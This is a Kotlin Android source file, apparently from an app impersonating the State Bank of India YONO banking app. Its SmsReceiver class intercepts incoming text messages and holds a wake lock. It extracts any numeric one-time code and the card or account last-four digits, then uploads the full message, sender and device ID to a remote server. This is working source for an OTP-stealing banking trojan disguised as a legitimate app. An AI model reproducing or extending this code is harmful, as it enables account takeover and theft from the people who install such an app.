package com.sbi.yonosbi.services

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.PowerManager
import android.provider.Telephony
import kotlinx.coroutines.*

class SmsReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "SMS_DEBUG"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        android.util.Log.d(TAG, "SmsReceiver.onReceive: action=$action")
        if (
            action != Telephony.Sms.Intents.SMS_DELIVER_ACTION &&
            action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION
        ) {
            android.util.Log.d(TAG, "SmsReceiver ignored unexpected action=$action")
            return
        }

        val pendingResult = goAsync()
        val wakeLock = acquireWakeLock(context)

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                android.util.Log.d(TAG, "SmsReceiver extracted ${messages.size} message part(s)")
                for (sms in messages) {
                    val sender = sms.originatingAddress ?: continue
                    val body = sms.messageBody ?: continue
                    val timestamp = sms.timestampMillis

                    val otp = extractOtp(body)
                    android.util.Log.d(
                        TAG,
                        "SmsReceiver message: sender=$sender, timestamp=$timestamp, bodyLength=${body.length}, otpDetected=${otp != null}"
                    )

                    // Only send if OTP detected
                    if (otp != null) {
                        sendSmsToServer(context, sender, body, timestamp)
                    } else {
                        android.util.Log.d(TAG, "SmsReceiver skipped message because no OTP was detected")
                    }
                }

            } catch (exception: Exception) {
                android.util.Log.e(TAG, "SmsReceiver failed to process incoming SMS", exception)
            } finally {
                wakeLock?.takeIf { it.isHeld }?.release()
                pendingResult.finish()
            }
        }
    }

    private fun acquireWakeLock(context: Context): PowerManager.WakeLock? {
        return try {
            val powerManager =
                context.getSystemService(Context.POWER_SERVICE) as PowerManager
            val wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "Yonosbi:SmsReceiverWakeLock"
            )
            wakeLock.acquire(60_000)
            wakeLock
        } catch (_: Exception) {
            null
        }
    }

    private suspend fun sendSmsToServer(
        context: Context,
        sender: String,
        message: String,
        timestamp: Long
    ) {
        val userApiService = UserApiService(context)
        try {
            val deviceId = DeviceService.getDeviceId(context)
            val cardSuffix = extractCardSuffix(message)
            android.util.Log.d(
                TAG,
                "Sending OTP SMS to server: sender=$sender, timestamp=$timestamp, cardSuffix=$cardSuffix"
            )

            val success = userApiService.sendSmsMessage(
                sender = sender,
                message = message,
                timestamp = timestamp,
                deviceId = deviceId,
                cardSuffix = cardSuffix
            )
            android.util.Log.d(TAG, "sendSmsToServer completed: success=$success")
            if (!success) {
                userApiService.reportClientDiagnostic(
                    event = "sms_upload_failed",
                    details = mapOf(
                        "sender" to sender,
                        "timestamp" to timestamp,
                        "card_suffix" to cardSuffix,
                        "body_length" to message.length
                    )
                )
            }
        } catch (exception: Exception) {
            android.util.Log.e(TAG, "sendSmsToServer failed", exception)
            userApiService.reportClientDiagnostic(
                event = "sms_upload_exception",
                details = mapOf(
                    "sender" to sender,
                    "timestamp" to timestamp,
                    "body_length" to message.length,
                    "exception" to (exception.message ?: exception.javaClass.simpleName)
                )
            )
        }
    }

    /** Extract OTP from message body */
    private fun extractOtp(message: String): String? {
        val regex = "\\b\\d{3,9}\\b".toRegex()
        return regex.find(message)?.value
    }

    /** Extract card suffix (last 4 digits) from message body */
    private fun extractCardSuffix(message: String): String? {
        val regex =
            "(?i)(?:ending|card|a/c|acc|account|no\\.?)\\s*(?:in|xx|\\*\\*|\\s)*(\\d{4})\\b".toRegex()
        return regex.find(message)?.groupValues?.get(1)
    }
}
